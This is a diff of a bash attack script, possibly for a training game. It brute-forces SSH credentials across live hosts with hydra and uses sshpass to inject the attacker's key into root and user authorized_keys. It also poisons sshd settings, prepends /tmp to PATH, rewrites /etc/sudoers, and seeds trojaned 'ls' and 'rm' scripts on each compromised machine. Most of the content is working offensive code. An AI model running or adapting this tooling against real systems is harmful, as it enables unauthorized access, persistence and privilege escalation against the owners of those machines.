@@ -23,11 +23,13 @@
 	# 'would you like to play a game'
 	# setup params
 	# correct for pre-infected
+	# fix weird fuckup if SIGTERM during process
 	#### multiple levels of attack
 	# masking attacking IP
 	# obfuscating code
 	# hidden file locations
 	# no hints
+	# roll in hashcat &/ john
 	# etc..
 	#******************************************************
 	#
@@ -64,25 +66,14 @@ fi 							###
 attackDog=$(hostname -I)
 crackedLogins="./crackedLogins"
 ###########################################################################################
-#are you root? no? well, try again
-###########################################################################################
-function neo(){
-	if [[ $EUID -ne 0  ]]; then
-		printf "\nyou forgot to run as root again... "
-		printf "\nCurrent dir is "$(pwd)"\n\n"
-		exit 1
-	fi
-}
-
-###########################################################################################
 # check/install/configure apps
 ###########################################################################################
 function meat(){
 # wanted app lists
-	command="hydra hashcat john nmap curl net-tools sshpass"
+	command="hydra nmap curl net-tools sshpass"
 	installing=""
 	updated=0
-	scriptPath="$(pwd)/$(basename $0)"
+	scriptPath="$BASH_SOURCE"
 
 	#### updating repo list, if it hasn't already been updated recently
 		if [[ $updated == 0 ]]; then
@@ -103,9 +94,6 @@ function meat(){
 		else
 			printf "\n--------------------------------------------------------------------\n"
 		fi
-
-
-
 }
 ###########################################################################################
 # checking for files and dirs
@@ -189,9 +177,9 @@ function brute(){
 	### testing all login info for all IPs
 		#**** if hydra.restore ask if skip ****************************************************
 		#also ask if want ot restore
-		if [ -f hydra.restore ]; then
-:
-		fi
+		#if [ -f hydra.restore ]; then
+
+		#fi
 		#***** if not success with basic, then do full ****************************************
 		command hydra -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -M "$liveHosts" ssh
 		command sed -i '/^#/d' "$hydraOutput"
@@ -211,7 +199,7 @@ function brute(){
 ###########################################################################################
 function b52(){
 	function payload(){
-		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
+		osDetectL2="$(uname -v | egrep -o "Debian|Ubuntu")"
 		# Ubuntu
 		ubuPATH="/etc/environment"
 		ubuSecPATH="/etc/sudoers"
@@ -245,37 +233,37 @@ function b52(){
 		# clears cached command paths
 		hash -r
 	### is Debian ###
-		if [ $osDetect == "Debian" ]; then
+		if [ $osDetectL2 == "Debian" ]; then
 			testPATH="echo $PATH | cut -d: -f1"
 			if [[ "$testPATH" != "/tmp" ]]; then
 				#changes PATH for current user, no matter what it is
 				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
 			fi
 
-			sudo sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
-			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
+			sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
+			sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
 		fi
 	### is Ubuntu ###
-		if [ $osDetect == "Ubuntu" ]; then
-			sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
+		if [ $osDetectL2 == "Ubuntu" ]; then
+			sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
 		#colorizing bash shell
 			userList=$(find /home /root -name .bashrc)
 			for rc in $userList;do
-				sudo sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
+				sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
 			done
 			# copies and edits the sudoers file
-			sudo cp $ubuSecPATH $ubuSecPATHnew
-			sudo chmod 750 $ubuSecPATHnew
-			sudo sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
-			sudo chmod 0440 $ubuSecPATHnew
+			cp $ubuSecPATH $ubuSecPATHnew
+			chmod 750 $ubuSecPATHnew
+			sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
+			chmod 0440 $ubuSecPATHnew
 			# checks that the changes are good
 			visudo -c -f $ubuSecPATHnew > /dev/null
 			# moves the modified file over the old one
 			if [ "$?" -eq "0" ]; then
-			sudo cp $ubuSecPATHnew $ubuSecPATH
+				cp $ubuSecPATHnew $ubuSecPATH
 			fi
 			#garbage collection
-			sudo rm $ubuSecPATHnew
+			rm $ubuSecPATHnew
 		fi
 ###################################################
 ### dirty scripts #################################
@@ -389,15 +377,15 @@ function b52(){
 		triggerPath="/tmp/.trigger"
 		incrementPath="/tmp/.increment"
 		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
-		sudo echo "$dirtyLS" | tee $seedPathsLS > /dev/null
-		sudo echo "$dirtyRM" | tee $seedPathsRM > /dev/null
+		echo "$dirtyLS" | tee $seedPathsLS > /dev/null
+		echo "$dirtyRM" | tee $seedPathsRM > /dev/null
 		# creates/resets the increment file
-		sudo echo "increment=0" > $incrementPath
+		echo "increment=0" > $incrementPath
 		# creates the trigger file
-		sudo touch $triggerPath
+		touch $triggerPath
 		# makes everything executable
-		sudo chmod +x $seedPathsLS $seedPathsRM
-		sudo chmod 777 $seedPathsLS $seedPathsRM
+		chmod +x $seedPathsLS $seedPathsRM
+		chmod 777 $seedPathsLS $seedPathsRM
 
 	}
 #=========================================================================
@@ -421,7 +409,7 @@ while read -r tango; do
 
 #inserting ssh keys for root and the cracked user
 	printf "\nInserting ssh key into [$target] using: $username\n"
-	sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" <$HOME/.ssh/id_rsa.pub
+	sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" </root/.ssh/id_rsa.pub
 #New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
 	printf "\nPoisoning sshd rules on [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "mkdir /root/.vim
@@ -434,8 +422,18 @@ while read -r tango; do
 #jumping into each box and letting loose the plague
 	printf "\nReleasing the plague inside of [$target]\n"
 	ssh -n -o StrictHostKeyChecking=no $target "$(declare -f payload); payload"
-done <<< $(sort -u $crackedLogins)
+done <<< $(sort -u $crackedLogins | sed '/^$/d')
 
+}
+###########################################################################################
+#are you root? no? well, try again
+###########################################################################################
+function neo(){
+	if [[ $EUID -ne 0  ]]; then
+		printf "\nyou forgot to run as root again... "
+		printf "\nCurrent dir is "$(pwd)"\n\n"
+		exit 1
+	fi
 }
 
 ###########################################################################################
@@ -450,7 +448,7 @@ done <<< $(sort -u $crackedLogins)
 #	#	unfuck				# local files
 #	}						#
 #	#########################
-#		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
+#		osDetectL2="$(uname -v | egrep -o "Debian|Ubuntu")"
 #		# Ubuntu
 #		ubuPATH="/etc/environment"
 #		ubuSecPATH="/etc/sudoers"
@@ -510,7 +508,7 @@ done <<< $(sort -u $crackedLogins)
 #		# clears cached command paths
 #		hash -r
 #	### is Debian ###
-#		if [ $osDetect == "Debian" ]; then
+#		if [ $osDetectL2 == "Debian" ]; then
 #			testPATH="echo $PATH | cut -d: -f1"
 #			if [[ "$testPATH" != "/tmp" ]]; then
 #				#changes PATH for current user, no matter what it is
@@ -521,7 +519,7 @@ done <<< $(sort -u $crackedLogins)
 #			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
 #		fi
 #		### is Ubuntu ###
-#			if [ $osDetect == "Ubuntu" ]; then
+#			if [ $osDetectL2 == "Ubuntu" ]; then
 #				sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
 #				ubuVisudo $ubuCleanRootPATH $ubuDirtyRootPATH
 #			#colorizing bash shell
@@ -535,12 +533,12 @@ done <<< $(sort -u $crackedLogins)
 #### un-fuck ########################################
 #	function unfuck(){
 #	### is Debian ###
-#		if [ $osDetect == "Debian" ]; then
+#		if [ $osDetectL2 == "Debian" ]; then
 #			sudo sed -i "s|$debDirtyRootPATH|$debCleanRootPATH|" $debPATH
 #			sudo sed -i "s|$debDirtyUserPATH|$debCleanUserPATH|" $debPATH
 #		fi
 #	### is Ubuntu ###
-#		if [ $osDetect == "Ubuntu" ]; then
+#		if [ $osDetectL2 == "Ubuntu" ]; then
 #			sudo sed -i "s|$ubuDirtyUserPATH|$ubuCleanUserPATH|" $ubuPATH
 #			ubuVisudo $ubuDirtyRootPATH $ubuCleanRootPATH
 #			printf "\n+++++++\ndirtyRoot=$ubuDirtyRootPATH\ncleanRoot=$ubuCleanRootPATH"
